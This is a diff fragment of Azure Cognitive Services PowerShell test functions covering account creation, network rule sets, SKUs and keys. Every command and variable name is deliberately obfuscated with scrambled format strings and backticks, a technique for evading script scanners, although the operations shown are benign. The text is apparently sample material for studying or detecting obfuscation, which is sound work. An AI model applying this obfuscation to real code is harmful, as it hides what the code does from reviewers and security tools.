+        ${l`OC} = &("{0}{1}{2}" -f'Get-','L','ocation') -providerNamespace ("{5}{0}{6}{3}{1}{7}{2}{4}"-f'ro','Cogni','eService','.','s','Mic','soft','tiv') -resourceType ("{0}{1}{2}" -f 'a','ccount','s') -preferredLocation ("{2}{0}{1}" -f 't Ce','ntral US','Wes');
+
+        &("{3}{1}{0}{2}"-f'ourceG','Res','roup','New-Az') -Name ${Rg`N`Ame} -Location ${l`oC};
+
+		${V`NeT} = &("{0}{2}{6}{3}{1}{5}{7}{4}" -f 'C','tV','reateAn','Ge','work','irtualN','d','et') ${r`GnA`me} ${v`Ne`T`NAme}
+
+		${NETW`O`RkrULE`SEt} =  ( &("{2}{0}{1}"-f 'ET-i','tem','G') ('VaR'+'iAB'+'le:45'+'lXI')  ).VaLuE::("{0}{1}"-f'N','ew').Invoke()
+		${NeT`woRkRul`E`seT}.("{0}{1}" -f 'AddIpR','ule').Invoke(("{2}{0}{1}" -f '00','.0.0.0','2'))
+		${NEtWo`RKr`UlE`Set}."AddvI`RTuAlN`Etw`ORK`Ru`lE"(${v`NEt}."s`Ubn`eTS"[0]."Id")
+
+        ${cReA`T`edAcCoUnT} = &("{6}{4}{2}{7}{1}{5}{0}{3}" -f 'Ac','Se','niti','count','ew-AzCog','rvices','N','ve') -ResourceGroupName ${rgn`AmE} -Name ${aCco`U`N`Tname} -Type ${a`CcO`U`NTtYpE} -SkuName ${SkU`NAMe} -Location ${l`oc} -CustomSubdomainName ${A`CCoun`T`NaME} -Force -NetworkRuleSet ${N`e`TWOr`KRuL`eSeT};
+        &("{0}{2}{1}{3}"-f'A','ser','s','t-NotNull') ${crE`A`TEDaCCo`Unt};
+    }
+    finally
+    {
+        
+        &("{2}{4}{0}{3}{1}{5}"-f'an-Resou','Gro','Cl','rce','e','up') ${R`Gn`AmE}
+    }
+}
+
+
+
+function tEsT`-se`T`A`ZUReRM`CoGnITi`V`e`S`er`V`ICesAC`CoUNtWI`ThcU`StOMDOMa`In
+{
+    
+    ${R`GnA`me} = &("{7}{3}{12}{13}{2}{11}{10}{6}{5}{9}{8}{0}{1}{4}"-f's','tResourceN','v','o','ame','i','v','Get-C','e','cesManagementT','r','eSe','g','niti');
+
+    try
+    {
+        
+        ${aCCoU`N`T`NAmE} = 'csa' + ${RG`NAMe};
+        ${skUN`AME} = 'S2';
+        ${A`CcOU`NTT`yPe} = ("{1}{2}{3}{0}"-f's','T','ext','Analytic');
+        ${L`Oc} = &("{3}{0}{2}{1}"-f'-','on','Locati','Get') -providerNamespace ("{5}{0}{6}{2}{3}{4}{1}{7}"-f 'soft.','vi','gnitiv','eS','er','Micro','Co','ces') -resourceType ("{0}{2}{1}"-f 'acc','ts','oun') -preferredLocation ("{0}{3}{1}{2}"-f 'W','st Cen','tral US','e');
+
+        &("{0}{2}{3}{4}{1}"-f'New-A','ceGroup','zRes','o','ur') -Name ${Rgna`ME} -Location ${L`oc};
+
+        ${cre`A`TedAC`COuNT} = &("{2}{4}{6}{0}{5}{3}{1}" -f'tiveServices','unt','New-Az','co','C','Ac','ogni') -ResourceGroupName ${RgNA`me} -Name ${AcC`o`UNtNa`Me} -Type ${AcCO`U`NttYPE} -SkuName ${s`kU`NAme} -Location ${L`Oc} -Force;
+        &("{2}{1}{0}"-f 'ull','ert-NotN','Ass') ${creat`E`D`A`ccoUNt};
+        
+		${c`hangeDaC`cOuNt} = &("{4}{2}{3}{0}{1}" -f'ervicesAc','count','AzCognitiv','eS','Set-') -ResourceGroupName ${RG`Na`me} -Name ${ac`cO`UNtnaME} -CustomSubdomainName ${ACCOu`Nt`N`Ame} -Force;
+		&("{4}{2}{3}{0}{1}" -f 'No','tNull','ert','-','Ass') ${c`HAnGedaCcO`U`NT};
+        &("{0}{2}{1}" -f 'Asse','True','rt-') {${c`HANgE`DA`C`CoUnT}."EN`D`POInT".("{0}{2}{1}"-f'C','ins','onta').Invoke(("{2}{5}{3}{4}{1}{0}" -f'zure.com','es.a','cog','v','eservic','niti'))}
+    }
+    finally
+    {
+        
+        &("{0}{3}{1}{4}{2}"-f 'Cle','n','roup','a','-ResourceG') ${R`gNAmE}
+    }
+}
+
+
+function TeS`T-SeT`Az`U`Re`RmCoGNItIveSErv`IcESa`CCOUN`TwIThVN`ET
+{
+    
+    ${r`gnA`Me} = &("{12}{2}{4}{7}{8}{5}{3}{0}{9}{10}{1}{11}{6}"-f'g','est','Cogniti','Mana','veSe','ces','me','rv','i','em','entT','ResourceNa','Get-');
+
+    try
+    {
+        
+        ${A`c`co`UnTnaMe} = 'csa' + ${Rg`NAmE};
+        ${vn`ET`Name} = ("{1}{0}" -f'et','vn') + ${rGN`AMe};
+        ${s`kUN`AMe} = 'S0';
+        ${aC`co`UNTt`yPe} = ("{1}{0}" -f'ace','F');
+        ${l`OC} = &("{0}{1}{2}{3}"-f'G','e','t-Locatio','n') -providerNamespace ("{3}{5}{7}{8}{1}{0}{6}{4}{2}"-f'Cogn','ft.','Services','M','ive','ic','it','ro','so') -resourceType ("{2}{0}{1}"-f'co','unts','ac') -preferredLocation ("{3}{4}{1}{2}{0}" -f ' EUAP','l U','S','Ce','ntra');
+
+        &("{0}{2}{1}{4}{3}" -f 'New-AzR','sourceGr','e','p','ou') -Name ${RG`N`Ame} -Location ${L`OC};
+		
+        ${C`R`EAt`EDaCcOUNT} = &("{5}{6}{7}{1}{3}{4}{2}{0}{8}"-f'un','-AzCognit','co','iveServic','esAc','N','e','w','t') -ResourceGroupName ${rg`NaMe} -Name ${AcC`ou`NtnA`Me} -Type ${A`ccO`UnttYPE} -SkuName ${SKu`NA`ME} -Location ${L`oC} -CustomSubdomainName ${AC`CounT`Name} -Force;
+        &("{1}{3}{2}{0}"-f'll','A','t-NotNu','sser') ${CREAtE`DAcc`ouNt};
+
+		${V`NET} = &("{6}{1}{3}{2}{5}{4}{0}"-f'etwork','ndGetVi','u','rt','lN','a','CreateA') ${r`GN`AMe} ${V`NETNA`Me}
+
+		${NEt`wOr`KrULESET} =   (&("{2}{1}{0}" -f 'BLE','Ia','vaR')  45lxI -VaLU)::("{0}{1}"-f'Ne','w').Invoke()
+		${n`et`WORkRulESET}.("{0}{3}{1}{2}" -f'A','u','le','ddIpR').Invoke(("{2}{0}{1}" -f'0.','0','200.0.'))
+		${netwO`RkRuL`ES`eT}."Ad`Dv`IrTUaLn`EtWOrkr`U`LE"(${v`NEt}."Su`Bn`Ets"[0]."iD")
+
+		${CHaNGed`A`cCou`Nt} = &("{5}{1}{6}{3}{2}{4}{7}{0}"-f 'unt','z','i','iveServ','cesAc','Set-A','Cognit','co') -ResourceGroupName ${R`Gna`ME} -Name ${accoU`N`TNAmE} -NetworkRuleSet ${ne`T`w`ORKru`lesET} -Force;
+		&("{4}{3}{1}{0}{2}" -f 'tNul','rt-No','l','e','Ass') ${C`HANGeDAcc`OU`Nt};
+    }
+    finally
+    {
+        
+        &("{2}{3}{1}{0}{4}" -f 'rou','rceG','Clean-R','esou','p') ${rGNA`me}
+    }
+}
+
+
+
+
+
+
+function tesT`-n`Etwo`RKr`Ules`Et
+{
+    
+    ${r`gN`AMe} = &("{3}{1}{10}{5}{7}{6}{4}{2}{0}{8}{9}"-f 'urce','-Cog','tTestReso','Get','men','veS','icesManage','erv','Nam','e','niti');
+
+    try
+    {
+        
+        ${aC`coun`Tna`mE} = 'csa' + ${RGN`A`me};
+        ${vnEt`Na`mE} = ("{0}{1}" -f'v','net') + ${rGna`mE};
+        ${Sk`UNA`ME} = 'S0';
+        ${acCOU`N`Tt`ypE} = ("{0}{1}"-f 'Fac','e');
+        ${l`Oc} = &("{3}{0}{1}{2}"-f 't-Loca','tio','n','Ge') -providerNamespace ("{3}{2}{0}{6}{5}{1}{4}" -f 'ognitiveSe','e','.C','Microsoft','s','vic','r') -resourceType ("{0}{2}{1}" -f 'acc','nts','ou') -preferredLocation ("{3}{1}{4}{2}{0}"-f'S EUAP','n','l U','Ce','tra');
+
+        &("{1}{4}{0}{3}{2}{5}"-f'u','New','G','rce','-AzReso','roup') -Name ${RgN`AME} -Location ${l`oc};
+		
+        ${CReA`TED`Acc`ouNt} = &("{7}{5}{2}{6}{3}{0}{1}{4}"-f 'itiveSer','vi','w-AzC','gn','cesAccount','e','o','N') -ResourceGroupName ${RGn`AmE} -Name ${a`C`CouN`TNAme} -Type ${ACcoUn`Tt`Y`pE} -SkuName ${Sku`NA`Me} -Location ${l`oc} -CustomSubdomainName ${A`C`couNtnAme} -Force;
+        &("{1}{2}{3}{0}" -f'll','Assert-','Not','Nu') ${c`REat`edAC`Cou`Nt};
+
+		${vn`ET} = &("{3}{0}{1}{4}{2}" -f'rea','teAndGetVirtualNet','k','C','wor') ${rg`NA`Me} ${V`NE`TnaME}
+
+		${V`NET`iD} = ${v`NEt}."Su`BNEts"[0]."iD"
+		${vN`etI`d2} = ${V`NeT}."S`U`BNetS"[1]."ID"
+
+		${ru`L`eSeT} = &("{7}{2}{4}{6}{3}{5}{0}{1}"-f 'uleSe','t','t-AzCognit','ountNet','i','workR','veServicesAcc','Ge') -ResourceGroupName ${r`G`Name} -Name ${AC`CO`UNt`NAMe}
+		&("{1}{0}{2}"-f 't-Nu','Asser','ll') ${rUl`ES`ET}
+
+		&("{5}{4}{1}{8}{7}{2}{0}{3}{6}"-f 'ntNe','gnitiveServ','ccou','two','Co','Update-Az','rkRuleSet','cesA','i') -ResourceGroupName ${rg`N`Ame} -Name ${acCOunTN`A`Me} -DefaultAction ("{0}{1}" -f 'De','ny')
+		${rULE`seT} = &("{0}{1}{2}{4}{5}{7}{3}{6}" -f 'Get-','Az','Cog','AccountNetworkRule','nit','iveSe','Set','rvices') -ResourceGroupName ${R`gNAme} -Name ${acCO`UN`Tna`ME}
+		&("{3}{0}{1}{2}"-f '-No','t','Null','Assert') ${rU`leS`eT}
+		&("{2}{3}{0}{1}" -f '-AreEqu','al','Ass','ert') ("{0}{1}"-f 'D','eny') ${r`UleSEt}."dEFA`ULtACTI`oN"
+		&("{0}{2}{1}"-f 'Assert-Ar','ual','eEq') 0 ${Ru`lES`Et}."IP`RULES"."Cou`Nt"
+		&("{3}{0}{1}{2}"-f'sert-AreE','qua','l','As') 0 ${r`U`LesET}."v`IR`TuAlNeTWOrKr`Ules"."C`Ount"
+
+		&("{3}{4}{5}{0}{2}{6}{1}"-f'e','le','rvicesAccountNetw','Add-','AzCognit','iveS','orkRu') -ResourceGroupName ${Rgn`A`ME} -Name ${aCc`Ou`NtName} -VirtualNetworkResourceId ${v`Ne`Tid}
+		${rUlE`S`ET} = &("{10}{9}{1}{5}{4}{2}{6}{0}{7}{3}{8}" -f 'cc','v','c','unt','vi','eSer','esA','o','NetworkRuleSet','ti','Get-AzCogni') -ResourceGroupName ${Rg`NAme} -Name ${A`C`cOunTNAME}
+		&("{1}{3}{2}{0}"-f 'll','Ass','rt-NotNu','e') ${RU`Le`set}
+		&("{1}{2}{3}{0}"-f'qual','Assert-A','re','E') ("{0}{1}" -f 'D','eny') ${RUL`esET}."D`EFA`ULTactI`oN"
+		&("{0}{2}{1}"-f 'Assert','ual','-AreEq') 0 ${r`U`lESeT}."I`Pru`LeS"."c`ount"
+		&("{2}{0}{1}{3}" -f '-A','reE','Assert','qual') 1 ${RuL`E`set}."vIrt`UALN`etWoR`KRUleS"."COu`NT"
+
+		&("{7}{10}{8}{6}{2}{9}{0}{5}{3}{4}{1}" -f'ccou','e','e','etw','orkRul','ntN','c','Ad','eServi','sA','d-AzCognitiv') -ResourceGroupName ${RgN`AmE} -Name ${A`CCoU`NTNA`mE} -VirtualNetworkResourceId ${vNE`T`Id2}
+		${Ru`lEs`ET} = &("{1}{3}{4}{0}{5}{6}{2}{7}{8}"-f 'esAc','Get-A','w','zCognitiveSe','rvic','c','ountNet','orkRu','leSet') -ResourceGroupName ${Rg`Na`ME} -Name ${a`Cco`UNTnAmE}
+		&("{2}{1}{4}{0}{3}" -f 'otNul','rt-','Asse','l','N') ${R`ULeS`eT}
+		&("{3}{4}{0}{2}{1}" -f'rt','ual','-AreEq','A','sse') ("{1}{0}"-f'ny','De') ${r`Ul`EsET}."dE`FAULt`Ac`TioN"
+		&("{2}{0}{1}{3}" -f't-AreEq','ua','Asser','l') 0 ${rule`Set}."iPr`UL`ES"."CO`UNT"
+		&("{1}{2}{3}{0}"-f 'al','Ass','ert-AreE','qu') 2 ${rUl`e`seT}."virTuAlN`EtwO`RKrU`les"."cOu`NT"
+
+		&("{6}{5}{4}{9}{7}{8}{3}{0}{2}{1}"-f 'sAccountN','ule','etworkR','e','Cogni','-Az','Remove','er','vic','tiveS') -ResourceGroupName ${rGn`A`Me} -Name ${a`CcoUnTN`AMe} -VirtualNetworkResourceId ${v`NeT`ID}
+		${RuleS`ET} = &("{3}{1}{5}{0}{8}{7}{6}{2}{4}"-f'itiv','et-AzCog','o','G','untNetworkRuleSet','n','c','cesAc','eServi') -ResourceGroupName ${RG`Name} -Name ${aC`C`ou`NtnaME}
+		&("{1}{2}{0}" -f 'tNull','Assert-','No') ${R`ULEs`eT}
+		&("{0}{4}{2}{1}{3}" -f 'Asser','AreEq','-','ual','t') ("{0}{1}" -f'De','ny') ${rul`es`ET}."DE`F`Ault`ACTiON"
+		&("{4}{0}{3}{1}{2}"-f'r','qua','l','eE','Assert-A') 0 ${r`UL`eSEt}."iprU`l`eS"."co`UNt"
+		&("{3}{2}{0}{1}" -f'a','l','Equ','Assert-Are') 1 ${r`UL`esEt}."VI`RTU`ALnE`T`wOrKRULES"."co`UnT"
+
+		&("{9}{8}{1}{4}{5}{3}{0}{2}{6}{7}"-f'sAcco','-','untN','iveService','AzCogn','it','etw','orkRule','e','Remov') -ResourceGroupName ${R`GnAme} -Name ${AcCou`Ntn`A`mE} -VirtualNetworkResourceId ${Vn`ETId2}
+		${RuLe`s`eT} = &("{5}{3}{8}{6}{4}{9}{11}{7}{12}{2}{0}{10}{1}" -f'rk','Set','tNetwo','et','o','G','zC','es','-A','gnitiveSer','Rule','vic','Accoun') -ResourceGroupName ${r`GnAmE} -Name ${aCCOu`N`T`NAMe}
+		&("{3}{4}{0}{2}{1}" -f 'r','otNull','t-N','A','sse') ${rul`eSeT}
+		&("{4}{0}{1}{3}{2}" -f 'rt-A','reE','l','qua','Asse') ("{1}{0}" -f 'eny','D') ${RULes`et}."d`e`FAUlTACT`ION"
+		&("{1}{2}{3}{0}"-f'qual','Assert-A','r','eE') 0 ${R`UlE`SEt}."IPr`Ul`ES"."cOu`NT"
+		&("{2}{0}{3}{1}"-f 'sert-A','l','As','reEqua') 0 ${r`ULe`sEt}."v`irtu`AlNE`Tw`or`KRuL`eS"."CoU`Nt"
+
+		&("{8}{4}{0}{5}{7}{3}{2}{6}{1}" -f'gni','ule','r','AccountNetwo','zCo','ti','kR','veServices','Add-A') -ResourceGroupName ${r`GN`AME} -AccountName ${aCcou`N`T`NAmE} -IpAddressOrRange ("{0}{1}{3}{2}" -f'16.','1','.0','7.18')
+		${r`U`lEsET} = &("{4}{6}{7}{0}{5}{9}{11}{10}{8}{3}{1}{2}"-f'it','or','kRuleSet','tw','G','iveSe','et','-AzCogn','tNe','rvi','n','cesAccou') -ResourceGroupName ${r`GNa`Me} -Name ${ACCo`Un`T`NaMe}
+		&("{0}{2}{1}" -f 'Asse','otNull','rt-N') ${R`ULES`eT}
+		&("{3}{0}{1}{2}" -f'ss','ert-Ar','eEqual','A') ("{1}{0}"-f'y','Den') ${ru`leSEt}."DeFA`Ult`Ac`T`IOn"
+		&("{0}{1}{3}{2}{4}" -f'Assert','-A','e','r','Equal') 1 ${RUl`e`Set}."IPrU`L`ES"."cO`Unt"
+		&("{2}{0}{1}"-f 't-A','reEqual','Asser') 0 ${R`UleS`et}."ViRTualNE`T`wor`KR`Ul`eS"."C`oUnT"
+
+		&("{6}{9}{2}{7}{0}{5}{10}{3}{4}{8}{1}"-f'nitiveSer','e','A','cco','untNe','vice','Ad','zCog','tworkRul','d-','sA') -ResourceGroupName ${r`gNa`Me} -AccountName ${ac`c`O`UNtNamE} -IpAddressOrRange ("{0}{3}{2}{1}"-f'1','8.1','17.1','6.')
+		${Ru`LES`et} = &("{4}{6}{7}{3}{1}{0}{9}{5}{2}{8}" -f'Acc','Services','NetworkRule','e','Get-A','unt','zCogni','tiv','Set','o') -ResourceGroupName ${R`G`NAMe} -Name ${a`CCouNt`NAME}
+		&("{1}{2}{0}"-f'rt-NotNull','As','se') ${r`ULEs`eT}
+		&("{3}{0}{1}{2}" -f's','ert-AreEqua','l','As') ("{0}{1}"-f 'Den','y') ${R`Ul`eSet}."defa`UL`TaCti`oN"
+		&("{0}{1}{2}{4}{3}"-f 'Asser','t','-','l','AreEqua') 2 ${R`UlES`et}."ip`RUl`Es"."cou`Nt"
+		&("{1}{0}{2}" -f'q','Assert-AreE','ual') 0 ${R`Ul`ESeT}."Vi`Rt`UaL`NetWorK`R`ULES"."cou`NT"
+
+		&("{3}{0}{10}{5}{1}{4}{12}{7}{6}{8}{11}{13}{2}{9}"-f 'e-AzCog','S','ul','Remov','ervi','tive','ccoun','A','t','e','ni','Ne','ces','tworkR') -ResourceGroupName ${RG`N`Ame} -Name ${aCcOu`Nt`N`Ame} -IpAddressOrRange ("{2}{1}{0}" -f '18.0','17.','16.')
+		${R`Ul`ESet} = &("{0}{1}{11}{8}{7}{4}{5}{2}{10}{3}{12}{6}{9}"-f 'G','et-','cesAccou','Net','e','rvi','l','S','ve','eSet','nt','AzCogniti','workRu') -ResourceGroupName ${RGNA`ME} -Name ${accOU`NT`NAME}
+		&("{1}{3}{2}{4}{0}" -f'tNull','A','sert-','s','No') ${RU`le`seT}
+		&("{0}{2}{1}{3}" -f'Ass','reEqua','ert-A','l') ("{0}{1}"-f'De','ny') ${Ru`leset}."dEFA`Ul`TaC`TiOn"
+		&("{2}{3}{0}{1}"-f 'Eq','ual','Ass','ert-Are') 1 ${rulE`s`et}."Iprul`Es"."co`UnT"
+		&("{1}{4}{2}{0}{3}" -f'eE','Assert','Ar','qual','-') 0 ${rULE`s`Et}."ViR`TU`ALNet`wOrkrulES"."CO`UnT"
+
+		&("{3}{2}{8}{1}{4}{5}{6}{0}{7}"-f't','vi','nitiv','Remove-AzCog','cesAcc','ount','Ne','workRule','eSer') -ResourceGroupName ${rg`N`AMe} -Name ${AC`COu`NT`NAmE} -IpAddressOrRange ("{0}{2}{1}"-f '16.','.1','17.18')
+		${Ru`LEsEt} = &("{4}{3}{1}{7}{2}{5}{8}{6}{0}"-f 'workRuleSet','iveSe','c','it','Get-AzCogn','cou','Net','rvicesA','nt') -ResourceGroupName ${rg`NamE} -Name ${ACCo`U`NT`NAME}
+		&("{0}{2}{3}{1}"-f 'A','Null','ssert','-Not') ${rU`Le`SeT}
+		&("{0}{1}{2}{4}{3}"-f 'A','ssert','-Ar','l','eEqua') ("{0}{1}"-f'Den','y') ${R`ULEs`ET}."dE`Fau`LtAction"
+		&("{0}{2}{1}{3}" -f'A','sert-A','s','reEqual') 0 ${Ru`l`eseT}."IPRu`l`ES"."Co`UNT"
+		&("{2}{1}{0}{4}{3}"-f're','A','Assert-','l','Equa') 0 ${rUL`eS`eT}."Virt`UAL`NETwoR`KruLeS"."cou`NT"
+
+		&("{8}{4}{7}{0}{5}{1}{3}{6}{2}" -f've','er','uleSet','vicesAccount','pdate-AzC','S','NetworkR','ogniti','U') -ResourceGroupName ${R`GN`AMe} -AccountName ${acc`ount`NamE} -DefaultAction ("{0}{1}"-f 'All','ow') -IPRule (@{("{2}{0}{1}" -f 'Addr','ess','Ip')=("{1}{3}{2}{0}" -f'.0','20','0.0','0.')},@{("{1}{0}{2}{3}" -f 'e','IpAddr','s','s')=("{2}{1}{0}"-f '.0/16','0','28.2.')}) -VirtualNetworkRule (@{('Id')=${v`NEt`id}},@{('Id')=${VNETi`d2}})
+		${RU`LeS`eT} = &("{1}{7}{4}{0}{2}{3}{6}{5}" -f 'sAccoun','Ge','t','NetworkRul','ce','Set','e','t-AzCognitiveServi') -ResourceGroupName ${R`GN`AMe} -Name ${ACcO`UnTNa`me}
+		&("{1}{2}{0}" -f'll','Asse','rt-NotNu') ${RUle`sET}
+		&("{0}{2}{3}{4}{1}" -f 'Ass','al','ert','-AreEq','u') ("{1}{0}"-f'ow','All') ${R`UlEs`eT}."De`FaUltaC`T`iON"
+		&("{1}{2}{0}{4}{3}"-f 're','As','sert-A','ual','Eq') 2 ${R`UlesEt}."I`Prul`Es"."CO`UNt"
+		&("{3}{2}{0}{1}"-f 'reEqua','l','-A','Assert') 2 ${RUL`ES`eT}."VIrTuALn`ETw`o`R`k`RuLES"."Co`UnT"
+
+    }
+    finally
+    {
+        
+        &("{4}{0}{1}{2}{3}"-f'ean-Re','sou','rce','Group','Cl') ${R`gn`Ame}
+    }
+}
+
+
+function tesT-gETa`ZUR`ErMC`ogn`It`iv`eser`VI`CeSaCcountSkuS
+{
+    
+    ${r`G`NamE} = &("{10}{6}{9}{3}{8}{4}{0}{7}{5}{11}{2}{1}" -f 'ana','ame','eN','e','M','entTe','ogn','gem','Services','itiv','Get-C','stResourc');
+    
+    try
+    {
+        ${Sk`Us} = (&("{5}{1}{3}{4}{0}{2}" -f 'ntSk','gniti','us','veS','ervicesAccou','Get-AzCo') -Type ("{0}{1}{2}" -f 'TextAnaly','t','ics'));
+        ${s`kun`AMES} = ${sk`Us} | &("{0}{1}{3}{2}"-f 'Sel','ect-Obje','t','c') -ExpandProperty ("{0}{1}"-f 'Nam','e') | &("{2}{0}{3}{1}"-f'r','t','So','t-Objec') | &("{0}{2}{3}{1}"-f'Ge','e','t-Un','iqu')
+        
+        ${eXp`EC`T`ed`SkuS} = "F0", "S", "S0","S1", "S2", "S3", "S4"
+        &("{1}{3}{4}{5}{0}{2}" -f'AreEq','A','ualArray','ss','e','rt-') ${exPECt`e`d`SK`US} ${SK`Un`AM`Es}
+
+		${s`kUs} = (&("{0}{2}{7}{6}{1}{5}{4}{3}"-f'Get','coun','-AzCognitiveServic','us','k','tS','sAc','e') -Type ("{1}{0}{2}"-f 'nal','TextA','ytics') -Location ("{1}{0}" -f 's','westu'));
+        ${SKu`Nam`Es} = ${S`kUS} | &("{2}{1}{0}{3}" -f'-Obje','lect','Se','ct') -ExpandProperty ("{0}{1}"-f 'N','ame') | &("{2}{0}{1}" -f't-Obje','ct','Sor') | &("{2}{1}{0}"-f'que','Uni','Get-')
+        
+        ${ExPe`CT`eD`SkuS} = "F0", "S", "S0","S1", "S2", "S3", "S4"
+        &("{5}{2}{1}{3}{0}{4}"-f 'rra','Ar','ert-','eEqualA','y','Ass') ${E`X`PeCtEDSKuS} ${sk`UNaM`es}
+
+        ${sK`Us} = (&("{4}{8}{3}{5}{7}{2}{0}{6}{9}{1}"-f 'oun','s','c','AzCognitiveS','Get','ervi','tS','cesAc','-','ku') -Type ("{2}{0}{1}" -f'nAMa','ker','Q') -Location ("{0}{1}"-f'glob','al'));
+        ${sk`Una`Mes} = ${SK`US} | &("{0}{4}{3}{1}{2}" -f'Select-','e','ct','j','Ob') -ExpandProperty ("{1}{0}"-f 'ame','N') | &("{1}{3}{0}{2}" -f'-Obje','So','ct','rt') | &("{1}{2}{3}{0}"-f'e','G','et','-Uniqu')
+        
+        &("{1}{2}{0}" -f'eEqual','Ass','ert-Ar') 0 ${S`kUNa`m`es}."COU`NT"
+
+    }
+    finally
+    {
+    }
+}
+
+
+function t`ES`T`-gEtAzuRER`MCog`N`IT`Iv`e`SErVice`S`Ac`COuNtTYPe
+{
+    try
+    {
+        ${Typ`en`AmE} = (&("{6}{1}{4}{2}{3}{0}{5}"-f 'tTy','t-AzCognit','veServi','cesAccoun','i','pe','Ge') -TypeName ("{0}{1}"-f 'Fac','e'));
+        &("{3}{2}{1}{0}" -f'reEqual','rt-A','se','As') ("{0}{1}"-f'Fac','e') ${T`YP`Ename}
+
+        ${tyPE`N`Ame} = (&("{7}{6}{1}{4}{2}{3}{5}{0}"-f 'ountType','-','zCogni','tiveServ','A','icesAcc','et','G') -TypeName ("{1}{0}{2}"-f'dK','Invali','ind'));
+        &("{1}{2}{0}"-f'-Null','Asse','rt') ${Ty`Pen`AMe}
+		
+		${tyPe`Na`Mes} = (&("{1}{2}{5}{0}{3}{4}"-f 'tiveServi','Get-Az','Cog','cesAcc','ountType','ni') -Location ("{1}{0}"-f'us','west'));
+        &("{2}{1}{3}{0}" -f'ue','e','Ass','rt-Tr') {${TYpENa`M`eS}.("{1}{0}{2}"-f 'on','C','tains').Invoke(("{1}{0}"-f 'ace','F'))}
+
+		${TYP`en`AmES} = (&("{5}{2}{3}{1}{0}{6}{4}" -f 'Ac','es','t-AzCognitiveServi','c','Type','Ge','count'));
+        &("{2}{0}{1}"-f 'se','rt-True','As') {${Ty`peNA`MEs}.("{1}{0}"-f 'ains','Cont').Invoke(("{0}{1}"-f'Fa','ce'))}
+
+		${typ`eN`Ames} = (&("{2}{1}{0}{6}{5}{3}{4}" -f'ervi','t-AzCognitiveS','Ge','untT','ype','Acco','ces') -Location ("{1}{0}" -f'al','glob'));
+        &("{0}{2}{1}" -f 'Assert','lse','-Fa') {${T`ypeN`AMES}.("{1}{2}{0}"-f 's','Cont','ain').Invoke(("{0}{1}"-f 'Fa','ce'))}
+        &("{2}{0}{1}"-f 'ert-Tru','e','Ass') {${tYpEN`A`MEs}.("{1}{2}{0}"-f'ains','Con','t').Invoke(("{2}{3}{1}{0}"-f '7','h.v','Bing.Sear','c'))}
+    }
+    finally
+    {
+    }
+}
+
+
+
+function te`St-P`iPingg`E`TaCc`OU`NttOgEtkEy
+{
+    
+    ${RGN`A`me} = &("{3}{10}{7}{2}{11}{8}{0}{5}{4}{1}{9}{6}" -f 'Manag','s','tiveServ','Get-Co','TestRe','ement','ame','ni','s','ourceN','g','ice');
+
+    try
+    {
+        
+        ${Ac`coUN`TnaMe} = 'csa' + ${r`gNaMe};
+        ${SK`U`NAME} = 'S2';
+        ${aC`C`oUNTtYpE} = ("{0}{2}{3}{1}"-f 'Te','alytics','xtA','n');
+        ${L`Oc} = &("{0}{3}{1}{2}"-f'Get-','ocati','on','L') -providerNamespace ("{1}{3}{2}{4}{0}"-f'eServices','Micros','.Cog','oft','nitiv') -resourceType ("{2}{0}{1}"-f'ount','s','acc') -preferredLocation ("{0}{1}" -f'W','est US');
+
+        &("{4}{1}{0}{2}{3}{5}" -f 'w-','e','A','zRes','N','ourceGroup') -Name ${rg`NAmE} -Location ${l`OC};
+        &("{4}{0}{1}{2}{3}"-f 'C','ognitiveS','ervicesAc','count','New-Az') -ResourceGroupName ${R`gn`Ame} -Name ${aCcO`UN`T`Name} -Type ${Ac`COUntt`yPe} -SkuName ${SKuN`A`ME} -Location ${L`OC} -Force;
+
+        ${Ke`ys} = &("{3}{2}{9}{7}{5}{8}{0}{4}{1}{6}"-f'Servi','Acco','z','Get-A','ces','iti','unt','n','ve','Cog') -ResourceGroupName ${R`gN`Ame} -Name ${aCC`OuNt`Na`me} | &("{7}{0}{1}{9}{2}{3}{4}{5}{8}{6}" -f '-AzCo','gnit','S','er','vice','sAcc','tKey','Get','oun','ive');
+        &("{3}{1}{0}{2}"-f '-AreNot','ssert','Equal','A') ${ke`YS}."K`EY1" ${kE`YS}."K`EY2";
+
+        &("{1}{2}{0}{3}" -f '-If','Re','try','Exception') { &("{0}{5}{3}{2}{1}{6}{9}{8}{7}{4}" -f'Remove-','er','nitiveS','og','t','AzC','vi','oun','Acc','ces') -ResourceGroupName ${r`gNaMe} -Name ${ac`C`oUnTnaMe} -Force; }
+    }
+    finally
+    {
+        
+        &("{1}{4}{2}{0}{5}{3}"-f'rc','Clea','ou','p','n-Res','eGrou') ${rgn`AME}
+    }
+}
+
+
+function TES`T-PI`pIn`G`T`oSeTAzUREA`CCoUNT
+{
+	
+    ${RGN`Ame} = &("{5}{1}{4}{10}{0}{11}{2}{7}{3}{9}{6}{8}{12}{13}"-f'e','et-C','esMana','entTe','ogn','G','Re','gem','sourc','st','itiv','Servic','eNa','me')
+
+    try
+    {
+        
+        ${a`ccOUNtn`Ame} = 'csa' + ${RG`N`Ame};
+        ${S`kunA`mE} = 'S2';
+        ${Acc`OuN`TType} = ("{0}{2}{1}"-f'T','lytics','extAna');
+        ${L`Oc} = &("{0}{3}{2}{1}"-f'Ge','ation','oc','t-L') -providerNamespace ("{3}{4}{5}{0}{1}{2}"-f 't.','CognitiveService','s','Mi','c','rosof') -resourceType ("{2}{1}{0}" -f'unts','o','acc') -preferredLocation ("{1}{0}{2}" -f'U','West ','S');
+
+        &("{2}{1}{3}{0}"-f 'p','urce','New-AzReso','Grou') -Name ${rG`Na`ME} -Location ${l`OC};
+        &("{2}{3}{1}{0}{4}{5}"-f 'tiveSe','ni','New-A','zCog','rvicesAcco','unt') -ResourceGroupName ${r`g`NAmE} -Name ${A`CCOuNTna`Me} -Type ${aCcO`Un`TTYPE} -SkuName ${S`kuN`AME} -Location ${l`oC} -Force;
+
+        ${Acc`o`UNT} = &("{6}{3}{7}{5}{1}{4}{8}{2}{0}" -f'nt','iveSe','esAccou','e','r','Cognit','G','t-Az','vic') -ResourceGroupName ${RGn`A`Me} -Name ${acCO`UN`TN`AME};
+		${aC`cOU`Nt} | &("{8}{4}{5}{0}{6}{7}{3}{2}{1}" -f 'i','t','oun','rvicesAcc','Co','gn','tiv','eSe','Set-Az') -SkuName ('S3') -Force;
+		
+        ${u`PD`AteDA`cCo`UNT} = &("{6}{5}{2}{1}{3}{0}{4}"-f 'esAc','rvi','eSe','c','count','gnitiv','Get-AzCo') -ResourceGroupName ${RG`N`Ame} -Name ${acCoUN`TN`A`me};
